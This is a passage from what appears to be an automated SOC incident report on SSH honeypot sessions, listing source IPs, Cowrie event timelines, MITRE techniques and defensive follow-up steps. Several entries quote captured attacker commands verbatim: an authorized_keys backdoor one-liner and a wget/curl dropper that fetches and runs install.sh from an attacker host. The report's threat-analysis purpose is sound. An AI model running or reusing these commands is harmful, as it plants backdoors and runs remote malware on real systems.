| **Source IP** | `119.156.194[.]77` |
| **First Seen** | 2026-08-04 01:08 |
| **Last Seen** | 2026-08-04 01:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 01:08:22` | `cowrie.session.connect` |
| `2026-08-04 01:08:22` | `cowrie.client.version` |
| `2026-08-04 01:08:22` | `cowrie.client.kex` |
| `2026-08-04 01:08:24` | `cowrie.login.success` |
| `2026-08-04 01:08:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.156.194[.]77` to AbuseIPDB if not already reported
- [ ] Block `119.156.194[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9872c2696431

| Field | Detail |
|---|---|
| **Source IP** | `196.190.180[.]18` |
| **First Seen** | 2026-08-04 01:15 |
| **Last Seen** | 2026-08-04 01:16 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 01:15:58` | `cowrie.session.connect` |
| `2026-08-04 01:15:59` | `cowrie.client.version` |
| `2026-08-04 01:15:59` | `cowrie.client.kex` |
| `2026-08-04 01:16:00` | `cowrie.login.success` |
| `2026-08-04 01:16:00` | `cowrie.direct-tcpip.request` |
| `2026-08-04 01:16:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.190.180[.]18` to AbuseIPDB if not already reported
- [ ] Block `196.190.180[.]18` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3d1b2197399

| Field | Detail |
|---|---|
| **Source IP** | `36.78.151[.]13` |
| **First Seen** | 2026-08-04 01:16 |
| **Last Seen** | 2026-08-04 01:16 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 01:16:10` | `cowrie.session.connect` |
| `2026-08-04 01:16:11` | `cowrie.client.version` |
| `2026-08-04 01:16:11` | `cowrie.client.kex` |
| `2026-08-04 01:16:14` | `cowrie.login.success` |
| `2026-08-04 01:16:15` | `cowrie.direct-tcpip.request` |
| `2026-08-04 01:16:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.78.151[.]13` to AbuseIPDB if not already reported
- [ ] Block `36.78.151[.]13` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a74914ae9bb

| Field | Detail |
|---|---|
| **Source IP** | `201.218.0[.]25` |
| **First Seen** | 2026-08-04 01:25 |
| **Last Seen** | 2026-08-04 01:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 01:25:23` | `cowrie.session.connect` |
| `2026-08-04 01:25:24` | `cowrie.client.version` |
| `2026-08-04 01:25:24` | `cowrie.client.kex` |
| `2026-08-04 01:25:25` | `cowrie.login.success` |
| `2026-08-04 01:25:26` | `cowrie.direct-tcpip.request` |
| `2026-08-04 01:25:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.218.0[.]25` to AbuseIPDB if not already reported
- [ ] Block `201.218.0[.]25` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27733bcbcb60

| Field | Detail |
|---|---|
| **Source IP** | `200.105.141[.]172` |
| **First Seen** | 2026-08-04 01:25 |
| **Last Seen** | 2026-08-04 01:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 01:25:30` | `cowrie.session.connect` |
| `2026-08-04 01:25:31` | `cowrie.client.version` |
| `2026-08-04 01:25:31` | `cowrie.client.kex` |
| `2026-08-04 01:25:32` | `cowrie.login.success` |
| `2026-08-04 01:25:33` | `cowrie.direct-tcpip.request` |
| `2026-08-04 01:25:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.105.141[.]172` to AbuseIPDB if not already reported
- [ ] Block `200.105.141[.]172` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ab7237f1395

| Field | Detail |
|---|---|
| **Source IP** | `179.185.227[.]77` |
| **First Seen** | 2026-08-04 01:25 |
| **Last Seen** | 2026-08-04 01:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 01:25:36` | `cowrie.session.connect` |
| `2026-08-04 01:25:37` | `cowrie.client.version` |
| `2026-08-04 01:25:37` | `cowrie.client.kex` |
| `2026-08-04 01:25:39` | `cowrie.login.success` |
| `2026-08-04 01:25:40` | `cowrie.direct-tcpip.request` |
| `2026-08-04 01:25:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.185.227[.]77` to AbuseIPDB if not already reported
- [ ] Block `179.185.227[.]77` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b24cd6cd6551

| Field | Detail |
|---|---|
| **Source IP** | `92.5.66[.]49` |
| **First Seen** | 2026-08-04 01:31 |
| **Last Seen** | 2026-08-04 01:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `id` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 01:31:49` | `cowrie.session.connect` |
| `2026-08-04 01:31:49` | `cowrie.client.version` |
| `2026-08-04 01:31:49` | `cowrie.client.kex` |
| `2026-08-04 01:31:50` | `cowrie.login.success` |
| `2026-08-04 01:31:50` | `cowrie.session.params` |
| `2026-08-04 01:31:50` | `cowrie.command.input` |
| `2026-08-04 01:31:50` | `cowrie.log.closed` |
| `2026-08-04 01:31:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.66[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.5.66[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-960cfe655632

| Field | Detail |
|---|---|
| **Source IP** | `85.104.111[.]237` |
| **First Seen** | 2026-08-04 01:33 |
| **Last Seen** | 2026-08-04 01:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 01:33:56` | `cowrie.session.connect` |
| `2026-08-04 01:33:56` | `cowrie.client.version` |
| `2026-08-04 01:33:56` | `cowrie.client.kex` |
| `2026-08-04 01:33:57` | `cowrie.login.success` |
| `2026-08-04 01:33:58` | `cowrie.direct-tcpip.request` |
| `2026-08-04 01:34:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.104.111[.]237` to AbuseIPDB if not already reported
- [ ] Block `85.104.111[.]237` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73eeb72c575d

| Field | Detail |
|---|---|
| **Source IP** | `65.20.161[.]126` |
| **First Seen** | 2026-08-04 01:34 |
| **Last Seen** | 2026-08-04 01:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 01:34:03` | `cowrie.session.connect` |
| `2026-08-04 01:34:03` | `cowrie.client.version` |
| `2026-08-04 01:34:03` | `cowrie.client.kex` |
| `2026-08-04 01:34:04` | `cowrie.login.success` |
| `2026-08-04 01:34:05` | `cowrie.direct-tcpip.request` |
| `2026-08-04 01:34:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.161[.]126` to AbuseIPDB if not already reported
- [ ] Block `65.20.161[.]126` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2da40cbdc419

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-04 01:34 |
| **Last Seen** | 2026-08-04 01:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 01:34:03` | `cowrie.session.connect` |
| `2026-08-04 01:34:03` | `cowrie.client.version` |
| `2026-08-04 01:34:03` | `cowrie.client.kex` |
| `2026-08-04 01:34:03` | `cowrie.login.success` |
| `2026-08-04 01:34:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e20514085b3

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-04 01:34 |
| **Last Seen** | 2026-08-04 01:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 01:34:05` | `cowrie.session.connect` |
| `2026-08-04 01:34:05` | `cowrie.client.version` |
| `2026-08-04 01:34:05` | `cowrie.client.kex` |
| `2026-08-04 01:34:06` | `cowrie.login.success` |
| `2026-08-04 01:34:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d75f9744b79c

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-04 01:34 |
| **Last Seen** | 2026-08-04 01:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 01:34:12` | `cowrie.session.connect` |
| `2026-08-04 01:34:12` | `cowrie.client.version` |
| `2026-08-04 01:34:12` | `cowrie.client.kex` |
| `2026-08-04 01:34:13` | `cowrie.login.success` |
| `2026-08-04 01:34:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b131347a1b78

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-04 01:34 |
| **Last Seen** | 2026-08-04 01:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 01:34:13` | `cowrie.session.connect` |
| `2026-08-04 01:34:13` | `cowrie.client.version` |
| `2026-08-04 01:34:13` | `cowrie.client.kex` |
| `2026-08-04 01:34:14` | `cowrie.login.success` |
| `2026-08-04 01:34:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5a84b232e91

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-04 01:36 |
| **Last Seen** | 2026-08-04 01:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 01:36:09` | `cowrie.session.connect` |
| `2026-08-04 01:36:09` | `cowrie.client.version` |
| `2026-08-04 01:36:09` | `cowrie.client.kex` |
| `2026-08-04 01:36:09` | `cowrie.login.success` |
| `2026-08-04 01:36:10` | `cowrie.direct-tcpip.request` |
| `2026-08-04 01:36:10` | `cowrie.direct-tcpip.data` |
| `2026-08-04 01:36:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc95c1ba1fb3

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]29` |
| **First Seen** | 2026-08-04 01:46 |
| **Last Seen** | 2026-08-04 01:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 01:46:37` | `cowrie.session.connect` |
| `2026-08-04 01:46:37` | `cowrie.client.version` |
| `2026-08-04 01:46:37` | `cowrie.client.kex` |
| `2026-08-04 01:46:38` | `cowrie.login.success` |
| `2026-08-04 01:46:39` | `cowrie.session.params` |
| `2026-08-04 01:46:39` | `cowrie.command.input` |
| `2026-08-04 01:46:39` | `cowrie.command.failed` |
| `2026-08-04 01:46:39` | `cowrie.log.closed` |
| `2026-08-04 01:46:40` | `cowrie.session.params` |
| `2026-08-04 01:46:40` | `cowrie.command.input` |
| `2026-08-04 01:46:40` | `cowrie.session.file_download` |
| `2026-08-04 01:46:40` | `cowrie.log.closed` |
| `2026-08-04 01:46:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]29` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]29` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aaae06d18034

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]29` |
| **First Seen** | 2026-08-04 01:46 |
| **Last Seen** | 2026-08-04 01:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 01:46:40` | `cowrie.session.connect` |
| `2026-08-04 01:46:40` | `cowrie.client.version` |
| `2026-08-04 01:46:40` | `cowrie.client.kex` |
| `2026-08-04 01:46:41` | `cowrie.login.success` |
| `2026-08-04 01:46:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]29` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]29` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98c596ab7941

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]29` |
| **First Seen** | 2026-08-04 01:46 |
| **Last Seen** | 2026-08-04 01:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 01:46:41` | `cowrie.session.connect` |
| `2026-08-04 01:46:41` | `cowrie.client.version` |
| `2026-08-04 01:46:41` | `cowrie.client.kex` |
| `2026-08-04 01:46:41` | `cowrie.login.success` |
| `2026-08-04 01:46:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]29` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]29` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b329f342ea1a

| Field | Detail |
|---|---|
| **Source IP** | `103.143.10[.]140` |
| **First Seen** | 2026-08-04 01:47 |
| **Last Seen** | 2026-08-04 01:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 01:47:32` | `cowrie.session.connect` |
| `2026-08-04 01:47:32` | `cowrie.client.version` |
| `2026-08-04 01:47:32` | `cowrie.client.kex` |
| `2026-08-04 01:47:32` | `cowrie.login.success` |
| `2026-08-04 01:47:33` | `cowrie.session.params` |
| `2026-08-04 01:47:33` | `cowrie.command.input` |
| `2026-08-04 01:47:33` | `cowrie.command.failed` |
| `2026-08-04 01:47:33` | `cowrie.log.closed` |
| `2026-08-04 01:47:34` | `cowrie.session.params` |
| `2026-08-04 01:47:34` | `cowrie.command.input` |
| `2026-08-04 01:47:34` | `cowrie.session.file_download` |
| `2026-08-04 01:47:34` | `cowrie.log.closed` |
| `2026-08-04 01:47:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.10[.]140` to AbuseIPDB if not already reported
- [ ] Block `103.143.10[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42ae0d4b9730

| Field | Detail |
|---|---|
| **Source IP** | `103.143.10[.]140` |
| **First Seen** | 2026-08-04 01:47 |
| **Last Seen** | 2026-08-04 01:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 01:47:34` | `cowrie.session.connect` |
| `2026-08-04 01:47:34` | `cowrie.client.version` |
| `2026-08-04 01:47:34` | `cowrie.client.kex` |
| `2026-08-04 01:47:34` | `cowrie.login.success` |
| `2026-08-04 01:47:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.10[.]140` to AbuseIPDB if not already reported
- [ ] Block `103.143.10[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6447bec0a78b

| Field | Detail |
|---|---|
| **Source IP** | `103.143.10[.]140` |
| **First Seen** | 2026-08-04 01:47 |
| **Last Seen** | 2026-08-04 01:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 01:47:34` | `cowrie.session.connect` |
| `2026-08-04 01:47:34` | `cowrie.client.version` |
| `2026-08-04 01:47:34` | `cowrie.client.kex` |
| `2026-08-04 01:47:35` | `cowrie.login.success` |
| `2026-08-04 01:47:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.10[.]140` to AbuseIPDB if not already reported
- [ ] Block `103.143.10[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bff87a39d10

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]231` |
| **First Seen** | 2026-08-04 01:50 |
| **Last Seen** | 2026-08-04 01:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp || cd /run || cd /var/run || cd /dev/shm; wget hxxp://94.154.43[.]231:3001/install.sh -O .x 2>/dev/null || curl -s hxxp://94.154.43[.]231:3001/install.sh -o .x; chmod 777 .x; ./.x telnet` |
| **Download Attempts** | hxxp://94.154.43[.]231:3001/install.sh, hxxp://94.154.43[.]231:3001/install.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 01:50:38` | `cowrie.session.connect` |
| `2026-08-04 01:50:38` | `cowrie.login.success` |
| `2026-08-04 01:50:38` | `cowrie.session.params` |
| `2026-08-04 01:50:39` | `cowrie.command.input` |
| `2026-08-04 01:50:39` | `cowrie.session.file_download` |
| `2026-08-04 01:50:39` | `cowrie.session.file_download` |
| `2026-08-04 01:50:39` | `cowrie.log.closed` |
| `2026-08-04 01:50:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]231` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]231` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ceb7c3d9ded9

| Field | Detail |
|---|---|
| **Source IP** | `185.148.144[.]114` |
| **First Seen** | 2026-08-04 02:00 |
| **Last Seen** | 2026-08-04 02:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 02:00:20` | `cowrie.session.connect` |
| `2026-08-04 02:00:20` | `cowrie.client.version` |
| `2026-08-04 02:00:20` | `cowrie.client.kex` |
| `2026-08-04 02:00:21` | `cowrie.login.success` |
| `2026-08-04 02:00:22` | `cowrie.session.params` |
| `2026-08-04 02:00:22` | `cowrie.command.input` |
| `2026-08-04 02:00:22` | `cowrie.command.failed` |
| `2026-08-04 02:00:22` | `cowrie.log.closed` |
| `2026-08-04 02:00:23` | `cowrie.session.params` |
| `2026-08-04 02:00:23` | `cowrie.command.input` |
| `2026-08-04 02:00:23` | `cowrie.session.file_download` |
| `2026-08-04 02:00:23` | `cowrie.log.closed` |
| `2026-08-04 02:00:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.148.144[.]114` to AbuseIPDB if not already reported
- [ ] Block `185.148.144[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-518244be6d80

| Field | Detail |
|---|---|
| **Source IP** | `185.148.144[.]114` |
| **First Seen** | 2026-08-04 02:00 |
| **Last Seen** | 2026-08-04 02:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 02:00:23` | `cowrie.session.connect` |
| `2026-08-04 02:00:23` | `cowrie.client.version` |
| `2026-08-04 02:00:23` | `cowrie.client.kex` |
| `2026-08-04 02:00:23` | `cowrie.login.success` |
| `2026-08-04 02:00:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.148.144[.]114` to AbuseIPDB if not already reported
- [ ] Block `185.148.144[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2392b1c28a73

| Field | Detail |
|---|---|
| **Source IP** | `185.148.144[.]114` |
| **First Seen** | 2026-08-04 02:00 |
| **Last Seen** | 2026-08-04 02:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 02:00:24` | `cowrie.session.connect` |
| `2026-08-04 02:00:24` | `cowrie.client.version` |
| `2026-08-04 02:00:24` | `cowrie.client.kex` |
| `2026-08-04 02:00:24` | `cowrie.login.success` |
| `2026-08-04 02:00:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.148.144[.]114` to AbuseIPDB if not already reported
- [ ] Block `185.148.144[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0849a408116f

| Field | Detail |
|---|---|
| **Source IP** | `196.188.93[.]169` |
